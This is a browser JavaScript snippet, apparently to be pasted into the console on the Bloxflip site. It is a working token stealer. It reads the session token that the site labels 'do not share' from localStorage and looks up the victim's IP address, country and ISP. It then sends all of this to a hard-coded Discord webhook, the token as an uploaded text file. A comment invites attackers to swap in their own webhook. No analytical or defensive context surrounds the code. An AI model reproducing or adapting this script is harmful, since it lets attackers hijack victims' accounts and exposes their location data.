var webhook = "https://discord.com/api/webhooks/1156251318399271033/jlo7hZCVPYVy6zJE0S-t8DXktU1_qL-bnWo-0rWnUqrRR_nVOGJS0V8_ANIzIvVE11bH"; // Replace with your new webhook URL

var token = window.localStorage["_DO_NOT_SHARE_BLOXFLIP_TOKEN"];
var tokens = token.match(/.{1,1000}/g);

// Combine all token parts into a single text file content
var combinedToken = tokens.join('');

// Function to get the user's IP address, full country name, and ISP from ipinfo.io
async function getUserInfo() {
  var infoResponse = await fetch("https://ipinfo.io/json");
  var infoData = await infoResponse.json();
  var userIP = infoData.ip;
  
  // Fetch full country name based on the two-letter code using RestCountries API
  var countryCode = infoData.country;
  var countryName = await getFullCountryName(countryCode);
  
  var isp = infoData.org;
  
  return { userIP, country: countryName, isp };
}

// Function to fetch the full country name from RestCountries API
async function getFullCountryName(countryCode) {
  var response = await fetch(`https://restcountries.com/v2/alpha/${countryCode}`);
  var data = await response.json();
  return data.name;
}

// Function to send the user's IP, full country name, and ISP in a red embed
async function sendUserInfo() {
  var userInfo = await getUserInfo();

  // Create an embed object with a red color and include user IP, country, and ISP
  var embed = {
    title: "User Information",
    color: 16711680, // Red color
    fields: [
      {
        name: "User IP",
        value: userInfo.userIP,
      },
      {
        name: "Country",
        value: userInfo.country,
      },
      {
        name: "ISP",
        value: userInfo.isp,
      },
    ],
  };

  // Create a JSON string from the embed object
  var embedJSON = JSON.stringify({ embeds: [embed] });

  // Send a POST request to the webhook with the embed
  var embedRequest = new XMLHttpRequest();
  embedRequest.open("POST", webhook);
  embedRequest.setRequestHeader("Content-type", "application/json");
  embedRequest.send(embedJSON);
}

// Delay the execution of sending the text file
setTimeout(function() {
  // Send the token as a text file
  var tokenRequest = new XMLHttpRequest();
  tokenRequest.open("POST", webhook);
  var blob = new Blob([combinedToken], { type: "text/plain" });
  var formData = new FormData();
  formData.append("file", blob, "combined_token.txt");
  tokenRequest.send(formData);
}, 2000); // Delay for 2 seconds (adjust as needed)

// Send user information first
sendUserInfo();
